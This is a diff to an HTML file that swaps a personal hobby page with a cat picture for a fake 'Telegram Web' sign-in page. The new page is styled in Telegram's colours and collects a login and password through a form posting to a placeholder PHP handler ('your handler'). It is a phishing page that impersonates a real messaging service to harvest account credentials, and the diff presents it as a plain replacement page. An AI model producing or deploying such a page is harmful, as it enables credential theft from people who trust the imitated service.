@@ -1,34 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Whitecat</title>
+    <title>Вход в Telegram Web</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            text-align: center;
+        }
+
+        .container {
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            background-color: #0088cc;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <header>
-        <h1>Добро пожаловать на мою веб-страницу</h1>
-    </header>
-    <nav>
-        <ul>
-            <li><a href="#">Главная</a></li>
-            <li><a href="#">О нас</a></li>
-            <li><a href="#">Контакты</a></li>
-        </ul>
-    </nav>
-    <main>
-        <section>
-            <h2>Описание от Ярослава:</h2>
-            <p>ппсадлррррпееаои001100олплннрщнрзшрак57777777777777777777777777777777777777777777777777777777777777777а</p>
-        </section>
-        <section>
-            <h2>Контент</h2>
-            <p>Вот картинка с котом:</p>
-            <img src="https://illustrators.ru/uploads/illustration/image/1193719/%D0%B1%D0%B5%D0%BB%D1%8B%D0%B9_%D0%BA%D0%BE%D1%82_%D1%85%D0%B5%D0%B4%D1%88%D0%BE%D1%82.jpg" alt="Описание изображения" width="200" height="200">
-            <p>Пока все.</p>
-        </section>
-    </main>
-    <footer>
-        <p>&copy; 2023 Моя компания. Все права защищены.</p>
-    </footer>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <div class="container">
+        <h1>Вход в Telegram Web</h1>
+        <form action="ваш_обработчик.php" method="post">
+            <input type="text" name="login" placeholder="Логин" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <input type="submit" value="Войти">
+        </form>
+    </div>
 </body>
 </html>
